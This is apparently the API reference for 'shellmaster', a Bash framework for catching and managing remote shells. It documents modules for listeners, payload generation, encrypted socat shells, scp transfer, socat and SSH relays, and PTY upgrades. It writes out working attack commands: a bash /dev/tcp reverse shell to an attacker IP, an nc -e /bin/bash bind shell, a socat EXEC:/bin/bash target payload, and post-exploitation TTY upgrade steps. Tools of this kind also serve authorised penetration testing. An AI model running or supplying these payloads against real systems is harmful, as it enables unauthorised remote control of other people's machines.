# API Reference

Function reference for all modules and core utilities.

---

## Table of Contents

1. [utils.sh — Core Utilities](#utilssh--core-utilities)
2. [config.sh — Configuration](#configsh--configuration)
3. [listeners.sh](#listenerssh)
4. [shells.sh](#shellssh)
5. [encrypt.sh](#encryptsh)
6. [transfer.sh](#transfersh)
7. [relay.sh](#relaysh)
8. [upgrade.sh](#upgradesh)

---

## utils.sh — Core Utilities

Sourced by `shellmaster.sh` before any module. All functions available globally.

### Color functions

| Function | Output |
|----------|--------|
| `color_red "text"` | Red text |
| `color_green "text"` | Green text |
| `color_yellow "text"` | Yellow text |
| `color_cyan "text"` | Cyan text |
| `color_blue "text"` | Blue text |

Respects `CLI_COLORS` — when set to `false`, returns plain text.

### Message helpers

| Function | Prefix | Stream |
|----------|--------|--------|
| `success_msg "text"` | `✓` green | stdout |
| `error_msg "text"` | `✗` red | stderr |
| `warn_msg "text"` | `⚠` yellow | stdout |
| `info_msg "text"` | `ℹ` cyan | stdout |

### Logging functions

Write JSON entries to `$LOG_FILE`. Only write when `LOG_LEVEL` permits.

```bash
log_debug "message"   # LOG_LEVEL=DEBUG only
log_info  "message"   # DEBUG or INFO
log_warn  "message"   # DEBUG, INFO, or WARN
log_error "message"   # Always
```

JSON format:
```json
{"timestamp":"2026-02-25T01:00:00Z","level":"INFO","message":"...","user":"root","pid":1234}
```

### Session functions

```bash
generate_session_id
# Returns: shell_<timestamp>_<random>
# Example: shell_1708867275_28340

create_session "$session_id" "$local_ip" "$local_port" "$remote_ip" "$remote_port"
# Writes: logs/sessions/${session_id}.json

log_session "$session_id" "$event" "$data"
# Appends JSON event to logs/sessions/${session_id}.log

list_sessions
# Prints table of all sessions in logs/sessions/
```

### Validation functions

```bash
validate_ip "192.168.1.1"   # Returns 0 if valid IPv4, 1 if not
validate_port "4444"         # Returns 0 if 1–65535, 1 if not
```

### File helpers

```bash
ensure_file "/path/to/file"   # Creates file if it doesn't exist
ensure_dir  "/path/to/dir"    # Creates directory if it doesn't exist
```

---

## config.sh — Configuration

Sourced by `shellmaster.sh`. Exports all variables and runs `init_framework()` automatically.

### Exported variables

| Variable | Default value | Purpose |
|----------|--------------|---------|
| `VERSION` | `1.0.0` | Framework version |
| `FRAMEWORK_DIR` | Project root (auto-detected) | Base path |
| `MODULES_DIR` | `$FRAMEWORK_DIR/modules` | Module files |
| `LOGS_DIR` | `$FRAMEWORK_DIR/logs` | Log output |
| `CERTS_DIR` | `$FRAMEWORK_DIR/certs` | SSL certificates |
| `PAYLOADS_DIR` | `$FRAMEWORK_DIR/payloads` | Generated payloads |
| `LOG_FILE` | `$LOGS_DIR/framework.log` | Main log file |
| `LOG_LEVEL` | `INFO` | Logging verbosity |
| `SESSION_DIR` | `$LOGS_DIR/sessions` | Session records |
| `SESSION_PREFIX` | `shell_` | Session ID prefix |
| `SESSION_TIMEOUT` | `3600` | Session timeout (seconds) |
| `DEFAULT_CIPHER` | `aes-256-cbc` | Encryption cipher |
| `KEY_SIZE` | `2048` | RSA key size (bits) |
| `CERT_VALIDITY` | `365` | Certificate validity (days) |
| `CLI_COLORS` | `true` | Enable colored output |

### init_framework()

Called automatically on source. Creates `logs/sessions/`, `certs/`, `payloads/`, and touches `LOG_FILE`.

---

## listeners.sh

### listeners_menu()

Entry point — called by main menu option `1`. Loops until user selects Back.

### setup_reverse_listener()

Prompts for port and rlwrap preference, creates a session, and starts an `nc`/`ncat` listener.

```
Prompts: listen IP (default 0.0.0.0), port (default 4444), use rlwrap [y/n]
Creates: logs/sessions/<session_id>.json
Starts:  nc -l -n -v -p <port>  (with optional rlwrap prefix)
```

### setup_bind_listener()

Starts a bind shell listener (`nc -e /bin/bash`) in the background.

```
Prompts: port (default 4444), use rlwrap [y/n]
Starts:  nc -l -n -v -p <port> -e /bin/bash &
Outputs: PID of background listener
```

### list_listeners()

Lists active `nc`/`ncat` processes via `ps`.

### stop_listener()

Prompts for a PID and sends SIGKILL.

---

## shells.sh

### shells_menu()

Entry point — called by main menu option `2`.

### generate_bash_payload()

Prompts for attacker IP/port, optional Base64 encoding and obfuscation. Outputs:
```bash
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

### generate_powershell_payload()

Prompts for attacker IP/port, optional Base64 encoding. Outputs a TCP PowerShell reverse shell one-liner.

### generate_python_payload()

Prompts for IP/port and Python version (2 or 3). Outputs a `socket`+`pty.spawn` one-liner.

### show_templates()

Displays static one-liner reference table (Bash TCP, Bash UDP, Python PTY).

### batch_generate()

Prompts for one IP/port pair and writes all three payload types to `PAYLOADS_DIR` at once.

### view_payloads()

Lists all files in `PAYLOADS_DIR` with size, MD5, and creation date from `.meta` files.

### prompt_save_payload()

Prompts "Save to file? [y/n]". If yes, writes payload to `PAYLOADS_DIR/<filename>` and calls `save_payload_metadata()`.

### save_payload_metadata()

Writes a `.meta` JSON file alongside each saved payload:
```json
{"filename":"bash_192.168.1.1_4444.sh","created_at":"...","size":45,"md5":"abc123","user":"root"}
```

---

## encrypt.sh

### encrypt_menu()

Entry point — called by main menu option `3`.

### generate_cert()

Generates a self-signed RSA-2048 certificate valid for 365 days and stores it in `CERTS_DIR`:

```
CERTS_DIR/bind.key  – private key
CERTS_DIR/bind.crt  – certificate
CERTS_DIR/bind.pem  – combined (key + cert, used by socat)
```

### start_socat_listener()

Checks for `socat` and `openssl`. Generates cert if missing. Prompts for port and starts:
```bash
socat file:`tty`,raw,echo=0 OPENSSL-LISTEN:<port>,cert=<pem>,verify=0
```

### gen_socat_payload()

Detects local IP via `hostname -I`. Prompts for LHOST/LPORT and outputs the target-side command:
```bash
socat OPENSSL:<LHOST>:<LPORT>,verify=0 EXEC:/bin/bash
```

### check_dependencies()

Returns 1 with an error message if `socat` or `openssl` is not installed.

---

## transfer.sh

### transfer_menu()

Entry point — called by main menu option `4`.

### upload_file()

Prompts for local file path, remote user, remote host, remote destination path. Runs:
```bash
scp <local_file> <user>@<host>:<path>
```

### download_file()

Prompts for remote user, remote host, remote file path, local save path. Runs:
```bash
scp <user>@<host>:<file> <local_path>
```

### verify_checksum()

Prompts for a file path. Outputs MD5 and SHA256:
```
MD5:    <hash>
SHA256: <hash>
```

Uses `md5sum`/`md5` and `sha256sum`/`shasum -a 256` with fallbacks.

### view_transfer_history()

Greps `LOG_FILE` for transfer-related entries and shows the last 20 lines.

---

## relay.sh

### relay_menu()

Entry point — called by main menu option `5`.

### create_socat_relay()

Prompts for listen port, forward host, and forward port. Starts in background:
```bash
socat TCP-LISTEN:<port>,fork,reuseaddr TCP:<host>:<port> &
```
Outputs the PID.

### create_ssh_tunnel()

Shows a sub-menu with three tunnel types:

| Option | SSH flag | Use case |
|--------|----------|---------|
| 1 | `-L local:remote_host:remote_port` | Access remote service locally |
| 2 | `-R remote:local_host:local_port` | Expose local service on remote |
| 3 | `-D socks_port` | Dynamic SOCKS proxy |

Runs `ssh ... -N -f` (background, no command).

### list_active_relays()

Lists active `socat` and `ssh -N` processes with PID and command.

### stop_relay()

Calls `list_active_relays()`, prompts for a PID, then sends SIGTERM.

---

## upgrade.sh

### upgrade_menu()

Entry point — called by main menu option `6`.

### upgrade_pty_python()

Displays step-by-step instructions for Python PTY upgrade:

```
Step 1 — on target:  python3 -c 'import pty; pty.spawn("/bin/bash")'
Step 2 — attacker:   Ctrl+Z  then  stty raw -echo; fg
Step 3 — on target:  export TERM=xterm-256color; stty rows N cols N
```

### upgrade_pty_script()

Displays instructions using `script`:

```
Step 1 — on target:  script -qc /bin/bash /dev/null
Step 2 — attacker:   Ctrl+Z  then  stty raw -echo; fg
```

Also shows the socat full-TTY alternative.

### fix_environment()

Displays paste-ready commands to fix a broken shell environment:
```bash
export TERM=xterm-256color
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
stty rows <N> cols <N>
reset
```

### enable_terminal_features()

Displays commands to enable history, coloured prompt, and tab completion.
